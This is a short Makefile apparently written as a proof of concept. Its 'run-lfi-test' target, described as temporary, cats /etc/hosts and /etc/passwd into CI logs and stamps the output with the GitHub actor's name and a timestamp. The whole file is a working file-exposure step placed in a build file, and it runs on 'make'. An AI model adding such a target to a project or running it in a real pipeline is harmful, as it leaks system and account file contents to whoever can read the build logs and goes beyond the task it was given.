# PoC: print /etc/hosts and /etc/passwd into CI logs (temporary test only)
.PHONY: run-lfi-test
run-lfi-test:
	@echo "=== LFI-POC: START ==="
	@echo "Marker: LFI-POC-$${GITHUB_ACTOR:-manual}-$$(date +%s)"
	@echo "--- /etc/hosts ---"
	@cat /etc/hosts || echo "(cannot read /etc/hosts)"
	@echo "--- /etc/passwd ---"
	@cat /etc/passwd || echo "(cannot read /etc/passwd)"
	@echo "=== LFI-POC: END ==="
